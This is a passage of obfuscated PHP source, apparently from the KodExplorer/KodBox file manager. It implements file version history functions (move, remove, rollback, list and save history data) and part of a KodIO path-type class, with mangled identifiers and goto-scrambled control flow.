IO::rename($Aš–™ÃÎØ‹[$A‚“äÇÍ³[76]], $EŞ¸ÄÈœìİ[1]); } } public static function eventBeforeMove($aİÓä®ç¢) { goto E™”…³ôÇ§; E™”…³ôÇ§: $Bé¶º‡³ˆ¿ =& $_SERVER[›é¼±]; $AÃÈÕáà = self::parsePath($aİÓä®ç¢[0]); if (!$AÃÈÕáà) { return; } goto bóáèá“ˆ; bóáèá“ˆ: $AØ†Ì™…öŒ = self::parsePath($aİÓä®ç¢[1]); if (!$AØ†Ì™…öŒ) { return; } $b™ªÆ–À¼¸ = $aİÓä®ç¢[3]; goto EÄŒÆğ²È“; B»ÂíÉˆ Å: if ($cµ–™…îÈ[$Bé¶º‡³ˆ¿[29]] == $Bé¶º‡³ˆ¿[193]) { $bÓ²¢Ÿ™‰ê = self::listData($AÃÈÕáà); $dâ‹¥ÎÏˆ… = rtrim($AØ†Ì™…öŒ, $Bé¶º‡³ˆ¿[8]) . $Bé¶º‡³ˆ¿[8] . ($b™ªÆ–À¼¸ ? $b™ªÆ–À¼¸ : get_path_this($AÃÈÕáà)); $c¨Ï»À²‰… = self::listData($dâ‹¥ÎÏˆ…); if ($bÓ²¢Ÿ™‰ê && $bÓ²¢Ÿ™‰ê[$Bé¶º‡³ˆ¿[367]] && $c¨Ï»À²‰… && $c¨Ï»À²‰…[$Bé¶º‡³ˆ¿[367]]) { return self::clear($AÃÈÕáà); } if ($bÓ²¢Ÿ™‰ê && $bÓ²¢Ÿ™‰ê[$Bé¶º‡³ˆ¿[367]]) { self::moveHistory($AÃÈÕáà, $b™ªÆ–À¼¸, $eğÅÄ‚‹³); } } else { IO::move($cµ–™…îÈ[$Bé¶º‡³ˆ¿[76]], $eğÅÄ‚‹³, !1, $b™ªÆ–À¼¸); self::clearEmptyFolder(IO::pathFather($cµ–™…îÈ[$Bé¶º‡³ˆ¿[76]])); } goto E÷œÚÅí·; EÄŒÆğ²È“: $cµ–™…îÈ = self::checkInHistory($AÃÈÕáà); if (!$cµ–™…îÈ) { return; } $eğÅÄ‚‹³ = self::pathHistory($AØ†Ì™…öŒ); goto B»ÂíÉˆ Å; E÷œÚÅí·: } public static function eventAfterRemove($CÍ‘‘é¼„, $CÕ˜îßÜƒ™) { goto A¬¢ˆö‹‰ê; AÙë–ùãº: if ($Eª²ÆŠ—[$C˜Ùø…Œ‡”[29]] == $C˜Ùø…Œ‡”[193]) { $fÎ›Ü•¹Ş = self::listData($b’–›…íöŒ, !1); if ($fÎ›Ü•¹Ş && $fÎ›Ü•¹Ş[$C˜Ùø…Œ‡”[367]]) { self::clear($b’–›…íöŒ, !1); } } else { IO::remove($Eª²ÆŠ—[$C˜Ùø…Œ‡”[76]]); self::clearEmptyFolder(IO::pathFather($Eª²ÆŠ—[$C˜Ùø…Œ‡”[76]])); } goto aÖÂ­Œªà‰; aÈ Ñª»í»: if (!$b’–›…íöŒ) { return; } $Eª²ÆŠ— = self::checkInHistory($b’–›…íöŒ); if (!$Eª²ÆŠ—) { return; } goto AÙë–ùãº; A¬¢ˆö‹‰ê: $C˜Ùø…Œ‡” =& $_SERVER[›é¼±]; if (!$CÕ˜îßÜƒ™) { return; } $b’–›…íöŒ = self::parsePath($CÍ‘‘é¼„[0]); goto aÈ Ñª»í»; aÖÂ­Œªà‰: } private static function checkInHistory($a­ä„«ÙÓ˜) { $c„Û’¥ÌÒê = self::pathHistory($a­ä„«ÙÓ˜); if (!IO::exist($c„Û’¥ÌÒê)) { $c„Û’¥ÌÒê .= $_SERVER[›é¼±][1151]; } return IO::exist($c„Û’¥ÌÒê) ? IO::info($c„Û’¥ÌÒê) : !1; } private static function parsePath($FˆÑó“ë‘ò) { goto Dæ‡ì„²; AîÛ”èŒ“Ñ: $eòÄ¸å¬ò¹ = KodIO::parse($FˆÑó“ë‘ò); $eÕ‰¸çÃ˜ñ = $eòÄ¸å¬ò¹[$D‹İ»Õ¬Ğ[29]]; $Aƒö÷®ŞÏ• = !$eÕ‰¸çÃ˜ñ || $eÕ‰¸çÃ˜ñ == KodIO::KOD_IO || $eÕ‰¸çÃ˜ñ == KodIO::KOD_SHARE_ITEM; goto AŞ†´ÊàÓ; AŞ†´ÊàÓ: if (!$Aƒö÷®ŞÏ• || !$eòÄ¸å¬ò¹[$D‹İ»Õ¬Ğ[1153]]) { return !1; } if (substr($FˆÑó“ë‘ò, 0, strlen(DATA_PATH . $D‹İ»Õ¬Ğ[1154])) == DATA_PATH . $D‹İ»Õ¬Ğ[1154]) { return !1; } if ($eÕ‰¸çÃ˜ñ == KodIO::KOD_SHARE_ITEM) { $cø¯÷¡Šª³ = IO::init($FˆÑó“ë‘ò); if ($cø¯÷¡Šª³->pathParse[$D‹İ»Õ¬Ğ[1081]]) { return self::parsePath($cø¯÷¡Šª³->pathParse[$D‹İ»Õ¬Ğ[1081]]); } return !1; } goto E¾±’è÷ïØ; D«Í‡­¹Õ: self::log($GLOBALS[$D‹İ»Õ¬Ğ[1076]] . $D‹İ»Õ¬Ğ[1156] . $FˆÑó“ë‘ò); return $FˆÑó“ë‘ò; goto BÚ·ÉåêÇ›; Dæ‡ì„²: $D‹İ»Õ¬Ğ =& $_SERVER[›é¼±]; if (!$FˆÑó“ë‘ò) { return !1; } if ($GLOBALS[$D‹İ»Õ¬Ğ[1152]]) { return; } goto AîÛ”èŒ“Ñ; E¾±’è÷ïØ: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $aºĞè©ÃÄ” = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $D‹İ»Õ¬Ğ[1155]); foreach ($aºĞè©ÃÄ” as $B°¢é¸µÄŒ) { if (!$eÕ‰¸çÃ˜ñ && substr($FˆÑó“ë‘ò, 0, strlen($B°¢é¸µÄŒ)) == $B°¢é¸µÄŒ) { return !1; } } goto D«Í‡­¹Õ; BÚ·ÉåêÇ›: } private static function pathHistory($D³¿ğ Ğß) { $fÂ‹‚¡è¾ø =& $_SERVER[›é¼±]; $b¾ÕÑø¹Íß = self::$_historyBase . ltrim(KodIO::clear($D³¿ğ Ğß), $fÂ‹‚¡è¾ø[8]); $b¾ÕÑø¹Íß = str_replace(array($fÂ‹‚¡è¾ø[1157]), array($fÂ‹‚¡è¾ø[1158]), $b¾ÕÑø¹Íß); return $b¾ÕÑø¹Íß; } public static function log($fñÆÂ¯Â×Ñ) { } public static function historyCount($f±Ê³•ª­) { $d¯²×¥Íä =& $_SERVER[›é¼±]; $d‹Ä“Ùáñï = array(); $Eñ½ëªê = array(); foreach ($f±Ê³•ª­ as $EÃ©õÀŒ») { $CªÔß„êØ = get_path_father($EÃ©õÀŒ»); if (!$Eñ½ëªê[$CªÔß„êØ]) { $Eñ½ëªê[$CªÔß„êØ] = array(); } $Eñ½ëªê[$CªÔß„êØ][] = get_path_this($EÃ©õÀŒ»); } foreach ($Eñ½ëªê as $CªÔß„êØ => $cµÙ×ÖµÓ) { $EÉ‚ğîÂ‰ç = self::parsePath($CªÔß„êØ); if (!$EÉ‚ğîÂ‰ç) { continue; } foreach ($cµÙ×ÖµÓ as $dÆƒ—ˆÏÓÖ) { $bŞŠ·’ò›Ø = self::listData(rtrim($EÉ‚ğîÂ‰ç, $d¯²×¥Íä[8]) . $d¯²×¥Íä[8] . $dÆƒ—ˆÏÓÖ, !1); if ($bŞŠ·’ò›Ø && $bŞŠ·’ò›Ø[$d¯²×¥Íä[367]]) { $d‹Ä“Ùáñï[rtrim($CªÔß„êØ, $d¯²×¥Íä[8]) . $d¯²×¥Íä[8] . $dÆƒ—ˆÏÓÖ] = count($bŞŠ·’ò›Ø[$d¯²×¥Íä[367]]); } } } return $d‹Ä“Ùáñï; } public static function add($fä“ñ‚µÚ) { goto d÷×ÇµË¨; f…†÷Ç…ÄÉ: if ($aè±ñºÑÏ’ && $aè±ñºÑÏ’[0][$D—¦ Üª†õ[171]] == $cË‡æ®ãâÅ) { return !0; } if (array_key_exists($D—¦ Üª†õ[196], $aÕÄ©•“ø) && !$aÕÄ©•“ø[$D—¦ Üª†õ[196]]) { return !1; } $AÍÏàÏÖÕé = short_id(time()); goto D»ç—˜¬È‡; d÷×ÇµË¨: $D—¦ Üª†õ =& $_SERVER[›é¼±]; $eÓóäºù = self::listData($fä“ñ‚µÚ); if (!$eÓóäºù) { return; } goto déæ¶÷É”; a˜Ôè¼‘Ş”: return self::saveData($eÓóäºù[$D—¦ Üª†õ[1164]], $aè±ñºÑÏ’); goto fÇµİ‹é˜¹; déæ¶÷É”: $CŒğÈ¿Š° = Model($D—¦ Üª†õ[765])->get($D—¦ Üª†õ[1159]); $d÷ÁÜ’íÁ  = $GLOBALS[$D—¦ Üª†õ[6]][$D—¦ Üª†õ[88]][$D—¦ Üª†õ[1137]]; $E™œ†¾¿Ôø = $CŒğÈ¿Š° == $D—¦ Üª†õ[1160] ? 5 : $d÷ÁÜ’íÁ ; goto eŸ”õÜÔˆ; C¸À‚é²: $aè±ñºÑÏ’ = $eÓóäºù[$D—¦ Üª†õ[367]]; if ($aÕÄ©•“ø[$D—¦ Üª†õ[78]] == 0) { return; } if ($aÕÄ©•“ø[$D—¦ Üª†õ[78]] >= 1024 * 1024 * 500) { return !1; } goto f…†÷Ç…ÄÉ; D»ç—˜¬È‡: $FÓñĞãƒ‹ = array($D—¦ Üª†õ[395] => $AÍÏàÏÖÕé, $D—¦ Üª†õ[171] => $cË‡æ®ãâÅ, $D—¦ Üª†õ[28] => $aÕÄ©•“ø[$D—¦ Üª†õ[28]] . $D—¦ Üª†õ[95] . date($D—¦ Üª†õ[1161]) . rand_string(1), $D—¦ Üª†õ[78] => $aÕÄ©•“ø[$D—¦ Üª†õ[78]], $D—¦ Üª†õ[446] => USER_ID, $D—¦ Üª†õ[194] => time(), $D—¦ Üª†õ[1162] => $D—¦ Üª†õ[33]); IO::mkdir($eÓóäºù[$D—¦ Üª†õ[1163]]); $b§ïíÅĞÂî = IO::copy($fä“ñ‚µÚ, $eÓóäºù[$D—¦ Üª†õ[1163]], !1, $FÓñĞãƒ‹[$D—¦ Üª†õ[28]]); goto Aç›ÒÖ–ğ; Aç›ÒÖ–ğ: if (!$b§ïíÅĞÂî) { self::clearEmptyFolder($eÓóäºù[$D—¦ Üª†õ[1163]]); return !1; } array_unshift($aè±ñºÑÏ’, $FÓñĞãƒ‹); if (count($aè±ñºÑÏ’) > $E™œ†¾¿Ôø) { $CÒ–øê—¥ = array_slice($aè±ñºÑÏ’, $E™œ†¾¿Ôø); foreach ($CÒ–øê—¥ as $bÚğÀíâ„ˆ) { IO::remove($eÓóäºù[$D—¦ Üª†õ[1163]] . $bÚğÀíâ„ˆ[$D—¦ Üª†õ[28]]); } $aè±ñºÑÏ’ = array_slice($aè±ñºÑÏ’, 0, $E™œ†¾¿Ôø); } goto a˜Ôè¼‘Ş”; eŸ”õÜÔˆ: if ($d÷ÁÜ’íÁ  <= 0) { return; } $cË‡æ®ãâÅ = IO::hashSimple($fä“ñ‚µÚ); $aÕÄ©•“ø = IO::info($fä“ñ‚µÚ); goto C¸À‚é²; fÇµİ‹é˜¹: } public static function remove($c‡›¿ÙÆˆˆ, $C…áˆéß•) { $CÌ¨®¢ø¯¼ =& $_SERVER[›é¼±]; $D­÷¯¹…Ñ = self::listData($c‡›¿ÙÆˆˆ); $Fİœä”œÈå = array(); if (!$D­÷¯¹…Ñ) { return !1; } foreach ($D­÷¯¹…Ñ[$CÌ¨®¢ø¯¼[367]] as $dÆÕÂ½òóö) { if ($dÆÕÂ½òóö[$CÌ¨®¢ø¯¼[395]] == $C…áˆéß•) { IO::remove($D­÷¯¹…Ñ[$CÌ¨®¢ø¯¼[1163]] . $dÆÕÂ½òóö[$CÌ¨®¢ø¯¼[28]]); continue; } $Fİœä”œÈå[] = $dÆÕÂ½òóö; } return self::saveData($D­÷¯¹…Ñ[$CÌ¨®¢ø¯¼[1164]], $Fİœä”œÈå); } public static function clear($D–®ìÂŠ, $a†³š‘Œï¸ = true) { $Då‹çíÄù‰ =& $_SERVER[›é¼±]; $f® ñèÚœÁ = self::listData($D–®ìÂŠ, $a†³š‘Œï¸); if (!$f® ñèÚœÁ) { return !1; } foreach ($f® ñèÚœÁ[$Då‹çíÄù‰[367]] as $eóÓÀ‚˜·â) { IO::remove($f® ñèÚœÁ[$Då‹çíÄù‰[1163]] . $eóÓÀ‚˜·â[$Då‹çíÄù‰[28]]); } return self::saveData($f® ñèÚœÁ[$Då‹çíÄù‰[1164]], array()); } public static function moveHistory($bİ¥ÒË‡éÄ, $B‡¯ç‚ß˜‹ = '', $D¨Ü÷¬Æ = '') { goto Eé„²â‰í; Cºà»Œéë¸: self::saveData($dì‘ºÜ˜œÄ[$eâãç–¤™[1164]], $dì‘ºÜ˜œÄ[$eâãç–¤™[367]]); self::clearEmptyFolder($dì‘ºÜ˜œÄ[$eâãç–¤™[1163]]); goto F°İ©šÂ”†; CÖÄŸèæ…¤: $cÈ­‡Õ‘ÇÉ = substr(get_path_this($dì‘ºÜ˜œÄ[$eâãç–¤™[1164]]), 0, -strlen($bè”Š„¼)); foreach ($dì‘ºÜ˜œÄ[$eâãç–¤™[367]] as $B²™Ï„ëó² => $f¦İ¹‚ãè­) { $A¦ó·øÛåĞ = $B‡¯ç‚ß˜‹ . substr($f¦İ¹‚ãè­[$eâãç–¤™[28]], strlen($cÈ­‡Õ‘ÇÉ)); $E°íÕ‹¨‘½ = IO::move($dì‘ºÜ˜œÄ[$eâãç–¤™[1163]] . $f¦İ¹‚ãè­[$eâãç–¤™[28]], $D¨Ü÷¬Æ, !1, $A¦ó·øÛåĞ); if ($E°íÕ‹¨‘½) { $dì‘ºÜ˜œÄ[$eâãç–¤™[367]][$B²™Ï„ëó²][$eâãç–¤™[28]] = $A¦ó·øÛåĞ; } } $dì‘ºÜ˜œÄ[$eâãç–¤™[1164]] = IO::move($dì‘ºÜ˜œÄ[$eâãç–¤™[1164]], $D¨Ü÷¬Æ, !1, $B‡¯ç‚ß˜‹ . $bè”Š„¼); goto Cºà»Œéë¸; Eé„²â‰í: $eâãç–¤™ =& $_SERVER[›é¼±]; $dì‘ºÜ˜œÄ = self::listData($bİ¥ÒË‡éÄ, !1); if (!$dì‘ºÜ˜œÄ || !$dì‘ºÜ˜œÄ[$eâãç–¤™[367]]) { return !1; } goto b±ÇåàØ‹´; b±ÇåàØ‹´: $bè”Š„¼ = $eâãç–¤™[1151]; $B‡¯ç‚ß˜‹ = $B‡¯ç‚ß˜‹ ? $B‡¯ç‚ß˜‹ : get_path_this($bİ¥ÒË‡éÄ); $D¨Ü÷¬Æ = $D¨Ü÷¬Æ ? $D¨Ü÷¬Æ : $dì‘ºÜ˜œÄ[$eâãç–¤™[1163]]; goto CÖÄŸèæ…¤; F°İ©šÂ”†: } public static function rollback($D·ò´ä˜Ûë, $B¡œƒÈà») { $B¼Ü¬Àº…à =& $_SERVER[›é¼±]; $AÄ³ÒˆñÌ = self::listData($D·ò´ä˜Ûë); if (!$AÄ³ÒˆñÌ) { return; } $eµè–Ì‹¿ä = IO::info($D·ò´ä˜Ûë); foreach ($AÄ³ÒˆñÌ[$B¼Ü¬Àº…à[367]] as $bÀ‰Ÿù­ÙÆ => $cí·Ñ‡É»õ) { if ($cí·Ñ‡É»õ[$B¼Ü¬Àº…à[395]] == $B¡œƒÈà») { self::add($D·ò´ä˜Ûë); $a ˜ßø‘ Û = $AÄ³ÒˆñÌ[$B¼Ü¬Àº…à[1163]] . $cí·Ñ‡É»õ[$B¼Ü¬Àº…à[28]]; $bï‰ÔÓñ¿® = IO::copy($a ˜ßø‘ Û, IO::pathFather($D·ò´ä˜Ûë), REPEAT_REPLACE, $eµè–Ì‹¿ä[$B¼Ü¬Àº…à[28]]); if ($bï‰ÔÓñ¿®) { self::remove($D·ò´ä˜Ûë, $B¡œƒÈà»); } return $bï‰ÔÓñ¿®; } } return !1; } public static function setDetail($dÒ¢è±°, $b‡§ÜÖŠ¢‰, $DÎ‡×é÷÷) { $DÖ˜Ù²°ö =& $_SERVER[›é¼±]; $c¹‚Ú…ŠÏí = self::listData($dÒ¢è±°); if (!$c¹‚Ú…ŠÏí) { return; } foreach ($c¹‚Ú…ŠÏí[$DÖ˜Ù²°ö[367]] as $bä‰ÎïÉ° => $d Â†İ¶µá) { if ($d Â†İ¶µá[$DÖ˜Ù²°ö[395]] == $b‡§ÜÖŠ¢‰) { $c¹‚Ú…ŠÏí[$DÖ˜Ù²°ö[367]][$bä‰ÎïÉ°][$DÖ˜Ù²°ö[1162]] = $DÎ‡×é÷÷; self::saveData($c¹‚Ú…ŠÏí[$DÖ˜Ù²°ö[1164]], $c¹‚Ú…ŠÏí[$DÖ˜Ù²°ö[367]]); return !0; } } return !1; } public static function fileInfo($e¢ßÇ²‘Ñ, $D÷¼Î²ø«) { goto F…¹ ¶ÄÑ; fòˆ§‡íìù: $FŒòçÚä©¶ = $d‡¯Â·˜ Š[33]; foreach ($cÍö¢‚Ç”é[$d‡¯Â·˜ Š[367]] as $cç† Ø†µ => $eŸ°¼‡¨ ) { if ($eŸ°¼‡¨ [$d‡¯Â·˜ Š[395]] != $D÷¼Î²ø«) { continue; } $FŒòçÚä©¶ = $cÍö¢‚Ç”é[$d‡¯Â·˜ Š[1163]] . $eŸ°¼‡¨ [$d‡¯Â·˜ Š[28]]; break; } if (!$FŒòçÚä©¶) { show_json(LNG($d‡¯Â·˜ Š[105]), !1); } goto eïÌ¼„ïŒ; eïÌ¼„ïŒ: return IO::info($FŒòçÚä©¶); goto EÜé¸Æõğ; F…¹ ¶ÄÑ: $d‡¯Â·˜ Š =& $_SERVER[›é¼±]; $cÍö¢‚Ç”é = self::listData($e¢ßÇ²‘Ñ); if (!$cÍö¢‚Ç”é) { show_json(LNG($d‡¯Â·˜ Š[105]), !1); } goto fòˆ§‡íìù; EÜé¸Æõğ: } public static function fileOut($FÇÙ‹ãÍá, $EƒñÁ‹ÙÒÂ, $FñÜŠ ÒÁ = false) { $föÒÕÌ¼¡á =& $_SERVER[›é¼±]; $EÉ·¦ªÌ„î = self::fileInfo($FÇÙ‹ãÍá, $EƒñÁ‹ÙÒÂ); $fİœãğŒ† =& $GLOBALS[$föÒÕÌ¼¡á[7]]; $FñÜŠ ÒÁ = isset($fİœãğŒ†[$föÒÕÌ¼¡á[1127]]) && $fİœãğŒ†[$föÒÕÌ¼¡á[1127]] == 1; if (isset($fİœãğŒ†[$föÒÕÌ¼¡á[29]]) && $fİœãğŒ†[$föÒÕÌ¼¡á[29]] == $föÒÕÌ¼¡á[1165]) { return IO::fileOutImage($EÉ·¦ªÌ„î[$föÒÕÌ¼¡á[76]], $fİœãğŒ†[$föÒÕÌ¼¡á[1166]]); } IO::fileOut($EÉ·¦ªÌ„î[$föÒÕÌ¼¡á[76]], $FñÜŠ ÒÁ, get_path_this($FÇÙ‹ãÍá)); } public static function listData($E†—ùŠ¶ ˆ, $Bë”§áàô = true) { goto f­Ççá×—½; DĞ‚ñ‰‰š´: $c‡¹¤‘Ş‘õ = IO::getContent($Fø ¬àè”[$AŞó†Û×©ï[1164]]); if ($c‡¹¤‘Ş‘õ) { $aºÆâá¨¯« = json_decode($c‡¹¤‘Ş‘õ, !0); if (is_array($aºÆâá¨¯«)) { $Fø ¬àè”[$AŞó†Û×©ï[367]] = $aºÆâá¨¯«; } } return $Fø ¬àè”; goto eä¯İÁ„õ³; f­Ççá×—½: $AŞó†Û×©ï =& $_SERVER[›é¼±]; if ($Bë”§áàô && !IO::exist($E†—ùŠ¶ ˆ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto D¬ˆÈŠ‚Ï†; D¬ˆÈŠ‚Ï†: if (substr($E†—ùŠ¶ ˆ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $fµ‹‡™Ù‘ù = self::pathHistory($E†—ùŠ¶ ˆ); $Fø ¬àè” = array($AŞó†Û×©ï[1164] => $fµ‹‡™Ù‘ù . $AŞó†Û×©ï[1151], $AŞó†Û×©ï[1163] => rtrim(get_path_father($fµ‹‡™Ù‘ù), $AŞó†Û×©ï[8]) . $AŞó†Û×©ï[8], $AŞó†Û×©ï[367] => array()); goto DĞ‚ñ‰‰š´; eä¯İÁ„õ³: } private static function saveData($DºªôÑˆŠ, $c”Ö›Æ›´‡) { goto B´ÙËò×ä×; B´ÙËò×ä×: $Aù–Œ¿´Šº =& $_SERVER[›é¼±]; self::log($Aù–Œ¿´Šº[1167] . $DºªôÑˆŠ . $Aù–Œ¿´Šº[68] . count($c”Ö›Æ›´‡), $Aù–Œ¿´Šº[747]); if ($c”Ö›Æ›´‡) { return IO::setContent($DºªôÑˆŠ, json_encode($c”Ö›Æ›´‡)); } goto e¹íß¡ÎÇ§; DÛ’†Ç£Î·: return !0; goto ağï‰¶”Á“; e¹íß¡ÎÇ§: $cêìÏŸ‘êä = IO::pathFather($DºªôÑˆŠ); IO::remove($DºªôÑˆŠ); self::clearEmptyFolder($cêìÏŸ‘êä); goto DÛ’†Ç£Î·; ağï‰¶”Á“: } public static function clearEmptyFolder($CÔÑÓ§¹Å) { goto E½öºÀ¶Ü¡; E½öºÀ¶Ü¡: $fÙ¥†©ÖéÍ =& $_SERVER[›é¼±]; if (trim($CÔÑÓ§¹Å, $fÙ¥†©ÖéÍ[8]) == trim(self::$_historyBase, $fÙ¥†©ÖéÍ[8])) { return; } $eÁÌÀÜÆŸ¼ = IO::pathFather($CÔÑÓ§¹Å); goto c™¾•ÙÃ¬ò; c™¾•ÙÃ¬ò: $Bİ¨™³Ó§Ó = IO::has($CÔÑÓ§¹Å, !0); if ($Bİ¨™³Ó§Ó[$fÙ¥†©ÖéÍ[203]] > 0 || $Bİ¨™³Ó§Ó[$fÙ¥†©ÖéÍ[204]] > 0) { return; } IO::remove($CÔÑÓ§¹Å); goto d…™İãà¨…; d…™İãà¨…: self::clearEmptyFolder($eÁÌÀÜÆŸ¼); goto F£Ü¿æà¹‡; F£Ü¿æà¹‡: } private static function getBasePath() { goto FóÇ’ïˆÖİ; bç©—’Ï‡«: file_put_contents($D»İ§Ì . $d®ò½˜øŒ[1171], $d®ò½˜øŒ[33]); file_put_contents(DATA_PATH . $d®ò½˜øŒ[1171], $d®ò½˜øŒ[33]); Model($d®ò½˜øŒ[1168])->set($d®ò½˜øŒ[1169], $D»İ§Ì); goto AŞÓƒÑš­ã; D ÃÅ£½ãÕ: $D»İ§Ì = DATA_PATH . $d®ò½˜øŒ[1170] . rand_string(8) . $d®ò½˜øŒ[8]; $D»İ§Ì = IO::mkdir($D»İ§Ì); $D»İ§Ì = rtrim($D»İ§Ì, $d®ò½˜øŒ[8]) . $d®ò½˜øŒ[8]; goto bç©—’Ï‡«; FóÇ’ïˆÖİ: $d®ò½˜øŒ =& $_SERVER[›é¼±]; $D»İ§Ì = Model($d®ò½˜øŒ[1168])->get($d®ò½˜øŒ[1169]); if ($D»İ§Ì) { if (!IO::exist($D»İ§Ì)) { IO::mkdir($D»İ§Ì); } if (get_path_this($D»İ§Ì) == $d®ò½˜øŒ[1154]) { $aùëªÚØ÷‹ = $d®ò½˜øŒ[1170] . rand_string(8); @rename($D»İ§Ì, get_path_father($D»İ§Ì) . $d®ò½˜øŒ[8] . $aùëªÚØ÷‹); $D»İ§Ì = DATA_PATH . $aùëªÚØ÷‹ . $d®ò½˜øŒ[8]; file_put_contents(DATA_PATH . $d®ò½˜øŒ[1171], $d®ò½˜øŒ[33]); Model($d®ò½˜øŒ[1168])->set($d®ò½˜øŒ[1169], $D»İ§Ì); } return $D»İ§Ì; } goto D ÃÅ£½ãÕ; AŞÓƒÑš­ã: return $D»İ§Ì; goto fÃšëÑƒÎç; fÃšëÑƒÎç: } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\122\145\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\x46\151\154\x65\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\x72\106\x69\154\145\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\x52\157\x6f\164\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\x75\x73\145\162\x53\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\123\150\141\162\x65\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\145\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\141\162\x65\111\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\111\164\145\155\114\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\x68\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\122\x65\156\x63\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\x65\x72\x7d"; public static function typeList() { $båè‰ïªŒœ =& $_SERVER[›é¼±]; return array($båè‰ïªŒœ[1172] => self::KOD_SOURCE, $båè‰ïªŒœ[1173] => self::KOD_USER_RECYCLE, $båè‰ïªŒœ[1174] => self::KOD_USER_FAV, $båè‰ïªŒœ[1175] => self::KOD_USER_FILE_TAG, $båè‰ïªŒœ[1176] => self::KOD_USER_FILE_TYPE, $båè‰ïªŒœ[1177] => self::KOD_GROUP_ROOT_SELF, $båè‰ïªŒœ[1178] => self::KOD_USER_SHARE, $båè‰ïªŒœ[1179] => self::KOD_USER_SHARE_LINK, $båè‰ïªŒœ[1180] => self::KOD_USER_SHARE_TO_ME, $båè‰ïªŒœ[1181] => self::KOD_SHARE_ITEM, $båè‰ïªŒœ[1182] => self::KOD_SHARE_LINK, $båè‰ïªŒœ[1183] => self::KOD_SEARCH, $båè‰ïªŒœ[1184] => self::KOD_BLOCK, $båè‰ïªŒœ[1185] => self::KOD_IO, $båè‰ïªŒœ[1186] => self::KOD_USER_RECENT, $båè‰ïªŒœ[1187] => self::KOD_USER_DRIVER); } public static function parse($C„š¯Ñî») { goto a™ªİœ±Å†; aòÌ¿äŒ‡æ: $báÄŸÂºÈŸ = array($c‘†ˆñÙŠ³[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $CÛò­Ë–¦º[$c‘†ˆñÙŠ³[1153]] = in_array($CÛò­Ë–¦º[$c‘†ˆñÙŠ³[29]], $báÄŸÂºÈŸ); return $CÛò­Ë–¦º; goto c…±÷†Õ¬; FÓ”ìŒ¸Ğ: preg_match($c‘†ˆñÙŠ³[1188], $C„š¯Ñî», $D ¥íó¶ŠÛ); $CÛò­Ë–¦º = array($c‘†ˆñÙŠ³[417] => !1, $c‘†ˆñÙŠ³[1189] => !1, $c‘†ˆñÙŠ³[414] => !1, $c‘†ˆñÙŠ³[76] => $C„š¯Ñî», $c‘†ˆñÙŠ³[1098] => !1, $c‘†ˆñÙŠ³[1097] => $c‘†ˆñÙŠ³[33]); if (is_array($D ¥íó¶ŠÛ) && count($D ¥íó¶ŠÛ) == 5) { $fÕ¢¥©·õ = $c‘†ˆñÙŠ³[1190] . $D ¥íó¶ŠÛ[2] . $c‘†ˆñÙŠ³[325]; if (in_array($fÕ¢¥©·õ, $CæÇ·Ã­’Å)) { $CÛò­Ë–¦º[$c‘†ˆñÙŠ³[1098]] = $D ¥íó¶ŠÛ[1]; $CÛò­Ë–¦º[$c‘†ˆñÙŠ³[29]] = $fÕ¢¥©·õ; $CÛò­Ë–¦º[$c‘†ˆñÙŠ³[1191]] = substr($fÕ¢¥©·õ, 1, -1); $CÛò­Ë–¦º[$c‘†ˆñÙŠ³[395]] = $D ¥íó¶ŠÛ[3]; } $CÛò­Ë–¦º[$c‘†ˆñÙŠ³[1097]] = $D ¥íó¶ŠÛ[4]; } goto aòÌ¿äŒ‡æ; a™ªİœ±Å†: $c‘†ˆñÙŠ³ =& $_SERVER[›é¼±]; $C„š¯Ñî» = self::clear($C„š¯Ñî»); $CæÇ·Ã­’Å = array_values(self::typeList()); goto FÓ”ìŒ¸Ğ; c…±÷†Õ¬: } public static function isTruePath($dò—…®²½) { goto d¬ßèâß¬¬; d¬ßèâß¬¬: $aâÇÀ½Û®¸ =& $_SERVER[›é¼±]; if (substr($dò—…®²½, 0, 1) != $aâÇÀ½Û®¸[1190]) { return !0; } if (strpos($dò—…®²½, $aâÇÀ½Û®¸[403]) === 0) { return !0; } goto B² íÈ²; Bº·–»­: if (strpos($dò—…®²½, $aâÇÀ½Û®¸[1194]) === 0) { return !0; } return !1; goto fƒÊéò®ÈÄ; B² íÈ²: if (strpos($dò—…®²½, $aâÇÀ½Û®¸[1157]) === 0) { return !0; } if (strpos($dò—…®²½, $aâÇÀ½Û®¸[1192]) === 0) { return !0; } if (strpos($dò—…®²½, $aâÇÀ½Û®¸[1193]) === 0) { return !0; } goto Bº·–»­; fƒÊéò®ÈÄ: } public static function clear($bÎêÕï÷¤­) { goto BÇñ™¬¢øâ; eÄì»é…éœ: return $bÎêÕï÷¤­; goto A£Æ–¯í£ï; C’‚Á§ç…–: $bÎêÕï÷¤­ = preg_replace($B–‡æ—¬Ö‡[1197], $B–‡æ—¬Ö‡[8], $bÎêÕï÷¤­); if ($bÎêÕï÷¤­ == $B–‡æ—¬Ö‡[8]) { return $B–‡æ—¬Ö‡[8]; } $bÎêÕï÷¤­ = rtrim($bÎêÕï÷¤­, $B–‡æ—¬Ö‡[8]); goto 